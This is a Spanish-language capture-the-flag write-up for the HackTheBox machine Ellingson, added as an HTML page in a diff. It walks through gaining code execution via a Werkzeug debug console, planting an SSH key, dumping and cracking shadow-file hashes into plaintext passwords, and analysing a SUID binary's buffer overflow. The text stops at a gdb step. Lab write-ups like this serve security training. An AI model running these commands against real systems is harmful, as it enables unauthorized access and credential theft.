@@ -1,0 +1,953 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Ellingson</title>
+
+  <meta name="description" content="Resolución de la máquina Ellingson de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Ellingson">
+  <meta name="twitter:description" content="Resolución de la máquina Ellingson de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="/images/htb/ellingson.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Ellingson">
+  <meta property="og:description" content="Resolución de la máquina Ellingson de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/htb/ellingson.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/htb/ellingson.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Ellingson" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-hal">Shell - hal</a></li>
+        <li><a href="#shell-margo">Shell - margo</a></li>
+        <li><a href="#shell-root">Shell - root</a></li>
+        <li><a href="#extra1-root">Extra 1 - root</a></li>
+        <li><a href="#extra2-root">Extra 2 - root</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="/images/htb/ellingson.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Ellingson</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">80</code> que corre un servicio <code class="language-plaintext highlighter-rouge">http</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.10.139
+Nmap scan report for 10.10.10.139  
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque es completamente innecesario, solo comodidad agregaremos al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> el dominio <code class="language-plaintext highlighter-rouge">ellingson.htb</code> para que al apuntar a el nos lleve a la ip</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.10.139 ellingson.htb" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La página principal muestra 3 articulos de la empresa <code class="language-plaintext highlighter-rouge">Ellingson Mineral Company</code></p>
+<a href="/htb/ellingson/1.png" target="_blank"><div><p><img src="/htb/ellingson/1.png"></p></div></a>
+
+<p class="plain-text">Visitando los articulos podemos ver que se gestionan simplemente apuntanto a la ruta <code class="language-plaintext highlighter-rouge">/articles/</code> y un identificador que en este caso solo es un numero cualquiera</p>
+<a href="/htb/ellingson/2.png" target="_blank"><div><p><img src="/htb/ellingson/2.png"></p></div></a>
+
+<p class="plain-text">Al apuntar al identificador <code class="language-plaintext highlighter-rouge">4</code> y este no existir nos lanza un error de <code class="language-plaintext highlighter-rouge">werkzeug</code> que al tener el modo <code class="language-plaintext highlighter-rouge">debug</code> habilitado podemos lanzarnos una consola de <code class="language-plaintext highlighter-rouge">python</code></p>
+<a href="/htb/ellingson/3.png" target="_blank"><div><p><img src="/htb/ellingson/3.png"></p></div></a>
+
+</section>
+<section class="post" id="shell-hal">
+<br><h3 class="post-title">Shell - hal</h3><br>
+
+<p class="plain-text">En este punto podemos importar la libreria <code class="language-plaintext highlighter-rouge">os</code> y mostrar el output de <code class="language-plaintext highlighter-rouge">os.popen</code> al ejecutar el comando <code class="language-plaintext highlighter-rouge">id</code>, en este caso lo ejecuta <code class="language-plaintext highlighter-rouge">hal</code> que pertenece al grupo adm</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">>>> import os
+>>> print(os.popen("id").read())
+uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)  
+>>></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Revisando si el usuario tiene un archivo <code class="language-plaintext highlighter-rouge">id_rsa</code> para conectarnos a ssh encontramos una, sin embargo esta parece encriptada y con <code class="language-plaintext highlighter-rouge">john</code> no conseguimos la contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">>>> print(open("/home/hal/.ssh/id_rsa").read())
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,4F7C6A9FD8FB74EDF6E605487045F91D
+
+qVxdFeBjyqXIUkZ6A+8u77HfZgUUwmPOuhN9xFYy+f36kKwr1Wol3iWRHB7W7Ien
+5vjyyNT3+mTO272NcAwreWRH0EZWDmvltWP5e9gESTpA4ja+vNP32UNwJ9lK1PLL
+mSm7XFl4xOMkhheRzJlLRF7b41C8PKsMVP2DpaHLMxHwTCY1fX5j/QgWpwPN5W0R
+DTQvsHyFj+gfsYjCTdrHUX0Dhg+LdVr7SH9NDt0twg/RxtXkAvwbyw3eRXAR0YCB
+mrldQ4ymh91G4CapoIOyGUVZUPE/Sz1ZExVCTlfGT9LUgE8L7aaImdOxFkrKDiVb
+ddhdWnXwnCrkxIaktwCSIFzl8iT71OxsQOcoq+VV8VbOsL2ICdgHNOIxQ2HonRQS
+Ej19P02Ea5rOHVVx/SYxT+ce6Zx301GkYmPu80LVVFK8x7gRajMYgFu/bgC67F91
+/QQ6IYkpoSr+eY8l0aJa5IpUo20sGV6xktiyx4V5+kMudiNTE/SAAea/vCCBBqZl
+5YFdp/TW5sqvkvB5w4/a/UUj1POa0tT/Ckox9JWq2idq+tYw+MATejY+Xv1HUOun
+YuV0Lm5AjdSBAcpIfU6ztJQ1zoVVYPqWXwRia38pSFDTz1pAHt9W6JBCRT3PKLo9
+rb8xOhvx6VNj4ZgvaEdxw25RCAGyoEN6/S7z/tgVYZvWoXRqUvOkYq2iyECQ+6ib
+qn/YjpRCX0Q9/3QRH0XSfTo7GvzbS4nTC2KubxmG9CJv/AAfdf1DcpvSfjtkUn5a
+bN1NOMWbJkrFCLeS6P4fPUJt8VwEJXP+IQaqz9bJYyRI1uIrG2PhzpRZ+24iHv63
+2lY+lZpeZBdagYJcp3qnh/f6kVtD+AyhyDurQ+EhsgBdqm4XM+d7AvilTDzqiU3v
+b6ZIzTRsVTWUKsTfvkiFop64d8uIov16b6FimiG/YNFQfd7SUL8hvjJVeArWRGjO
+vPn+RB4BYS0s3VZI+08Jo/BL8EXFeuMZdpbDFnGDhaINSL1/cZasQS6hRYUJsKZN
+T7ptM3NdKNyrVGwfKyttp3OHZFjPRjZezpBR60q+HI37pt/iDkuhbeK2Pr9jNR3f
+jfqv8lGlOMIoPA6ERxPveUrLldL6NfLT0gPasDrWo0RRDIzanqz0wYK/SfuIiumT
+8tonBa4kQlxAyenW1p+nx5bZ1QXPQaUbXbAe3AbOU2YG20LJ0v8mxVZE0zP9QNZM
+DSHtv3uIl3nONJIJryp8Y6UjW1q3+UaAnTS6J/IXk+JVsSIRs5hbNDtNLlhFowDq
+2OWEh2CRE7TNptk6Bb8pZbfyA/lCXJhJjo8YZLc3xZ2h1WF1vaXCHYo/FNqeoS0k
+yicWCEz2fSKfNMnMpcVreQglfA9u49+Cvqzt1JnIlX1gDUg8EXV5rLAEgiSRfVin
+B1pTjH/EROnppfQkteSbRq9B9rrvcEQ8Q5JPjr7kp3kk07spyiV6YqNmxVrvQtck
+rQ+X68SNYRpsvCegy59Dbe5/d6jMdFxBzUZQKAHCyroTiUS8PtsAIuRechR0Cbza
+OM2FRsIM8adUzfx7Q91Or+k2pIKNKqr+5sIpb4M0GHggd7gD10E+IBUjM9HsQR+o
+-----END RSA PRIVATE KEY-----
+>>></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh2john </span><span class="p">id_rsa > hash
+
+</span><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes  
+Cost 2 (iteration count) is 1 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo que podemos hacer es modificar el archivo <code class="language-plaintext highlighter-rouge">authorized_keys</code> para guardar nuestra clave <code class="language-plaintext highlighter-rouge">publica</code> para asi despues conectarnos a ssh sin proporcionar contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">>>> open("/home/hal/.ssh/authorized_keys", "w").write("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKYbzSK7e6XOM/4cOZIGWcgJ55cba+MaQCk6KJSFbRf kali@kali")  
+90
+>>></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">hal@ellingson.htb
+</span><span class="ve">hal@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
+uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)  
+</span><span class="ve">hal@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
+10.10.10.139
+</span><span class="ve">hal@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-margo">
+<br><h3 class="post-title">Shell - margo</h3><br>
+
+<p class="plain-text">Ya que formamos parte del grupo <code class="language-plaintext highlighter-rouge">adm</code> podemos buscar archivos que pertenezcan a este usando <code class="language-plaintext highlighter-rouge">find</code>, uno que llama la atención de primeras es <code class="language-plaintext highlighter-rouge">shadow.bak</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">hal@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -group adm 2>/dev/null | grep -v snap  
+/var/backups/shadow.bak
+/var/spool/rsyslog
+/var/log/auth.log
+/var/log/mail.err
+/var/log/fail2ban.log
+/var/log/kern.log
+/var/log/syslog
+/var/log/nginx
+/var/log/nginx/error.log
+/var/log/nginx/access.log
+/var/log/cloud-init.log
+/var/log/unattended-upgrades
+/var/log/apt/term.log
+/var/log/apport.log
+/var/log/mail.log
+</span><span class="ve">hal@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Este archivo es una copia del <code class="language-plaintext highlighter-rouge">/etc/shadow</code> y contiene hashes de varios usuarios del sistema en formato <code class="language-plaintext highlighter-rouge">sha-256</code> que si la contraseña es debil podemos crackear</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">hal@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /var/backups/shadow.bak
+root:*:17737:0:99999:7:::
+daemon:*:17737:0:99999:7:::
+bin:*:17737:0:99999:7:::
+sys:*:17737:0:99999:7:::
+sync:*:17737:0:99999:7:::
+games:*:17737:0:99999:7:::
+man:*:17737:0:99999:7:::
+lp:*:17737:0:99999:7:::
+mail:*:17737:0:99999:7:::
+news:*:17737:0:99999:7:::
+uucp:*:17737:0:99999:7:::
+proxy:*:17737:0:99999:7:::
+www-data:*:17737:0:99999:7:::
+backup:*:17737:0:99999:7:::
+list:*:17737:0:99999:7:::
+irc:*:17737:0:99999:7:::
+gnats:*:17737:0:99999:7:::
+nobody:*:17737:0:99999:7:::
+systemd-network:*:17737:0:99999:7:::
+systemd-resolve:*:17737:0:99999:7:::
+syslog:*:17737:0:99999:7:::
+messagebus:*:17737:0:99999:7:::
+_apt:*:17737:0:99999:7:::
+lxd:*:17737:0:99999:7:::
+uuidd:*:17737:0:99999:7:::
+dnsmasq:*:17737:0:99999:7:::
+landscape:*:17737:0:99999:7:::
+pollinate:*:17737:0:99999:7:::
+sshd:*:17737:0:99999:7:::
+theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::  
+hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
+margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
+duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
+</span><span class="ve">hal@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">john</code> para aplicar fuerza bruta logramos crackear <code class="language-plaintext highlighter-rouge">2</code> de los 4 hashes, sin embargo solo una de las contraseñas funciona en el sistema y es la de <code class="language-plaintext highlighter-rouge">margo</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes
+Using default input encoding: UTF-8
+Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 XOP 2x])  
+Remaining 2 password hashes with 2 different salts
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">password123      </span><span class="p">(</span><span class="am">theplague</span><span class="p">)
+</span><span class="am">iamgod$08        </span><span class="p">(</span><span class="am">margo</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos usar <code class="language-plaintext highlighter-rouge">ssh</code> para conectarnos como el usuario margo y asi leer la primera flag</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sshpass </span><span class="p">-p </span><span class="am">'iamgod$08' </span><span class="p">ssh margo@ellingson.htb
+</span><span class="ve">margo@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
+uid=1002(margo) gid=1002(margo) groups=1002(margo)  
+</span><span class="ve">margo@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
+10.10.10.139
+</span><span class="ve">margo@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat user.txt 
+7ec**************************877
+</span><span class="ve">margo@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-root">
+<br><h3 class="post-title">Shell - root</h3><br>
+
+<p class="plain-text">Buscando por archivos con privilegios <code class="language-plaintext highlighter-rouge">suid</code> encontramos ademas de los tipicos un binario que parece ser personalizado, este binario tiene el nombre <code class="language-plaintext highlighter-rouge">garbage</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">margo@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -perm -u+s 2>/dev/null | grep -v snap  
+/usr/bin/at
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/garbage
+/usr/bin/newuidmap
+/usr/bin/sudo
+/usr/bin/traceroute6.iputils
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/umount
+/bin/ntfs-3g
+/bin/ping
+/bin/mount
+/bin/fusermount
+</span><span class="ve">margo@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l /usr/bin/garbage
+-rwsr-xr-x 1 root root 18056 Mar  9  2019 </span><span class="err">/usr/bin/garbage</span><span class="p">
+</span><span class="ve">margo@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el binario nos pide una contraseña, si le pasamos cualquier string como <code class="language-plaintext highlighter-rouge">password</code> nos devolvera que esta es incorrecta y el programa se detendra</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">margo@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$ garbage
+Enter access password: password  
+
+access denied.
+</span><span class="ve">margo@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">ida</code> podemos decompilar el binario y de esta manera ver su codigo en <code class="language-plaintext highlighter-rouge">C</code></p>
+<a href="/htb/ellingson/5.png" target="_blank"><div><p><img src="/htb/ellingson/5.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">main</code> es facil de entender, llama a <code class="language-plaintext highlighter-rouge">auth</code> y si este devuelve true sigue con un <code class="language-plaintext highlighter-rouge">menú</code> que dependiendo de la elección llama a una función u otra</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">int</span><span class="p"> __fastcall __noreturn </span><span class="na">main</span><span class="p">(</span><span class="no">int </span><span class="am">argc</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">argv</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">envp</span><span class="p">)  
+{
+  </span><span class="no">int </span><span class="p">choice; </span><span class="c1">// [rsp+8h] [rbp-8h] BYREF
+  </span><span class="no">unsigned int </span><span class="p">uid; </span><span class="c1">// [rsp+Ch] [rbp-4h]
+
+  </span><span class="p">uid </span><span class="o">= </span><span class="p">check_user(argc, argv, envp);
+  set_username(uid);
+  </span><span class="o">if</span><span class="p"> ( </span><span class="o">!</span><span class="p">(</span><span class="no">unsigned int</span><span class="p">)auth(uid) )
+    </span><span class="no">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);
+  </span><span class="no">puts</span><span class="p">(</span><span class="s">"[+] W0rM || Control Application"</span><span class="p">);
+  </span><span class="no">puts</span><span class="p">(</span><span class="s">"[+] ---------------------------"</span><span class="p">);
+  </span><span class="no">puts</span><span class="p">(</span><span class="s">"Select Option"</span><span class="p">);
+  </span><span class="no">puts</span><span class="p">(</span><span class="s">"1: Check Balance"</span><span class="p">);
+  </span><span class="no">puts</span><span class="p">(</span><span class="s">"2: Launch"</span><span class="p">);
+  </span><span class="no">puts</span><span class="p">(</span><span class="s">"3: Cancel"</span><span class="p">);
+  </span><span class="no">puts(</span><span class="s">"4: Exit"</span><span class="p">);
+  </span><span class="o">while </span><span class="p">( </span><span class="mi">true</span><span class="p"> )
+  {
+    </span><span class="o">while</span><span class="p"> ( </span><span class="mi">true</span><span class="p"> )
+    {
+      </span><span class="o">while</span><span class="p"> ( </span><span class="mi">true</span><span class="p"> )
+      {
+        </span><span class="no">printf</span><span class="p">(</span><span class="s">"> "</span><span class="p">);
+        __isoc99_scanf(</span><span class="s">"</span><span class="mi">%d%*c</span><span class="s">"</span><span class="p">, </span><span class="o">&</span><span class="p">choice);
+        </span><span class="o">if</span><span class="p"> ( choice </span><span class="o">!= </span><span class="mi">2 </span><span class="p">)
+          </span><span class="o">break</span><span class="p">;
+        launch();
+      }
+      </span><span class="o">if </span><span class="p">( choice </span><span class="o">> </span><span class="mi">2</span><span class="p"> )
+        </span><span class="o">break</span><span class="p">;
+      </span><span class="o">if</span><span class="p"> ( choice </span><span class="o">!= </span><span class="mi">1 </span><span class="p">)
+        </span><span class="o">goto </span><span class="p">LABEL_14;
+      checkbalance();
+    }
+    </span><span class="o">if</span><span class="p"> ( choice </span><span class="o">!= </span><span class="mi">3 </span><span class="p">)
+    {
+      </span><span class="o">if</span><span class="p"> ( </span><span class="o">choice </span><span class="o">== </span><span class="mi">4 </span><span class="p">)
+        </span><span class="no">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);
+</span><span class="na">LABEL_14</span><span class="p">:
+      </span><span class="no">puts</span><span class="p">(</span><span class="s">"Unknown option"</span><span class="p">);
+      </span><span class="no">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);
+    }
+    cancel();
+  }
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La función auth define un buffer de <code class="language-plaintext highlighter-rouge">100</code> bytes para password y usa la funcion <code class="language-plaintext highlighter-rouge">gets</code> para recibir un input que compara con la cadena <code class="language-plaintext highlighter-rouge">N3veRF3@r1iSh3r3!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="na">__int64 </span><span class="p">__fastcall </span><span class="na">auth</span><span class="p">(</span><span class="no">int </span><span class="am">param_1</span><span class="p">)
+{
+  </span><span class="no">char </span><span class="p">buffer[</span><span class="mi">112</span><span class="p">]; </span><span class="c1">// [rsp+10h] [rbp-F0h] BYREF
+  </span><span class="no">char </span><span class="p">password[</span><span class="mi">100</span><span class="p">]; </span><span class="c1">// [rsp+80h] [rbp-80h] BYREF  
+  </span><span class="no">char </span><span class="p">user[</span><span class="mi">12</span><span class="p">]; </span><span class="c1">// [rsp+E4h] [rbp-1Ch] BYREF
+  </span><span class="no">int </span><span class="p">uid; </span><span class="c1">// [rsp+F0h] [rbp-10h]
+
+  </span><span class="p">uid </span><span class="o">= </span><span class="p">param_1;
+  </span><span class="no">strcpy</span><span class="p">(user, username);
+  </span><span class="no">printf</span><span class="p">(</span><span class="s">"Enter access password: "</span><span class="p">);
+  </span><span class="no">gets</span><span class="p">(password);
+  </span><span class="no">putchar</span><span class="p">(10);
+  </span><span class="o">if</span><span class="p"> ( </span><span class="o">!</span><span class="no">strcmp</span><span class="p">(password, </span><span class="s">"N3veRF3@r1iSh3r3!"</span><span class="p">) )
+  {
+    </span><span class="no">strcpy</span><span class="p">(buffer, </span><span class="s">"access granted for user: "</span><span class="p">);
+    </span><span class="no">strcat</span><span class="p">(buffer, user);
+    syslog(</span><span class="mi">6</span><span class="p">, buffer);
+    </span><span class="no">puts</span><span class="p">(</span><span class="s">"access granted."</span><span class="p">);
+    </span><span class="no">return </span><span class="mi">1</span><span class="no">LL</span><span class="p">;
+  }
+  </span><span class="o">else</span><span class="p">
+  {
+    </span><span class="no">puts</span><span class="p">(</span><span class="s">"access denied."</span><span class="p">);
+    </span><span class="o">return </span><span class="mi">0</span><span class="no">LL</span><span class="p">;
+  }
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si ejecutamos el binario usando esa <code class="language-plaintext highlighter-rouge">contraseña</code> este nos dara acceso al menu</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">margo@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$ garbage
+Enter access password: N3veRF3@r1iSh3r3!  
+
+access granted.
+[+] W0rM || Control Application
+[+] ---------------------------
+Select Option
+1: Check Balance
+2: Launch
+3: Cancel
+4: Exit
+></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La verdadera vulnerabilidad viene del hecho de usar un buffer de solo <code class="language-plaintext highlighter-rouge">100</code> bytes con la funcion vulnerable <code class="language-plaintext highlighter-rouge">gets</code> conocida por ser vulnerable a <code class="language-plaintext highlighter-rouge">buffer overflow</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">char </span><span class="p">password[</span><span class="mi">100</span><span class="p">]
+</span><span class="no">gets</span><span class="p">(password);</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Algo a tener en cuenta son las protecciones, en este caso nos encontramos con <code class="language-plaintext highlighter-rouge">NX</code> que nos impide ejecutar shellcode directamente por lo que tendremos que usar <code class="language-plaintext highlighter-rouge">ROP</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ checksec</span><span class="p"> garbage
+[</span><span class="az">*</span><span class="p">] '/home/kali/garbage'
+    Arch:     amd64-64-little
+    RELRO:    </span><span class="am">Partial RELRO</span><span class="p">
+    Stack:    </span><span class="ro">No canary found</span><span class="p">
+    NX:       </span><span class="ve">NX enabled</span><span class="p">
+    PIE:      </span><span class="ro">No PIE (0x400000)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ademas de que tendremos que lekear una direccion base de libc ya que el <code class="language-plaintext highlighter-rouge">ASLR</code> esta habilitado y las direcciones seran dinamicas cambiando asi en cada ejecución</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">margo@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /proc/sys/kernel/randomize_va_space  
+2
+</span><span class="ve">margo@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para iniciar abrimos le binario con <code class="language-plaintext highlighter-rouge">gdb</code> y creamos un patron de 100 caracteres especiales para buscar el <code class="language-plaintext highlighter-rouge">offset</code>, despues corremos el programa y lo enviamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gdb </span><span class="p">-q garbage
